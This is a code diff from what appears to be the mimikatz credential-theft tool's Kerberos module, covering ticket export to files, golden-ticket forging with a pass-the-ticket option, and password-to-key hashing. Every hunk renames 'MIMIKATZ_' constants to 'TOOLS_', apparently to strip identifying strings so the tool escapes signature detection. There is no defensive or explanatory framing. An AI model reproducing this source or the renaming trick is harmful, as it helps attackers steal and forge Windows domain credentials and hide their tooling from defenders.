@@ -239,7 +239,7 @@ NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
 						{
 							if(NT_SUCCESS(packageStatus))
 							{
-								if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], MIMIKATZ_KERBEROS_EXT))
+								if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], TOOLS_KERBEROS_EXT))
 								{
 									if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
 										kprintf(L"\n   * Saved to file     : %s", filename);
@@ -333,7 +333,7 @@ NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[])
 							LocalFree(ticketname);
 						}
 					if(isExport)
-						filename = kuhl_m_kerberos_generateFileName_short(&ticket, MIMIKATZ_KERBEROS_EXT);
+						filename = kuhl_m_kerberos_generateFileName_short(&ticket, TOOLS_KERBEROS_EXT);
 
 					LsaFreeReturnBuffer(pKerbRetrieveResponse);
 
@@ -422,7 +422,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 	PKERB_ECRYPT pCSystem;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
 
-	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket." MIMIKATZ_KERBEROS_EXT);
+	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket." TOOLS_KERBEROS_EXT);
 	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
 		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
@@ -685,7 +685,7 @@ NTSTATUS kuhl_m_kerberos_hash_data_raw(LONG keyType, PCUNICODE_STRING pString, P
 		if(*buffer = (PBYTE) LocalAlloc(LPTR, pCSystem->KeySize))
 		{
 			*dwBuffer = pCSystem->KeySize;
-			status = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? pCSystem->HashPassword_NT5(pString, *buffer) : pCSystem->HashPassword_NT6(pString, pSalt, count, *buffer);
+			status = (TOOLS_NT_MAJOR_VERSION < 6) ? pCSystem->HashPassword_NT5(pString, *buffer) : pCSystem->HashPassword_NT6(pString, pSalt, count, *buffer);
 			if(!NT_SUCCESS(status))
 			{
 				*buffer = (PBYTE) LocalFree(*buffer);
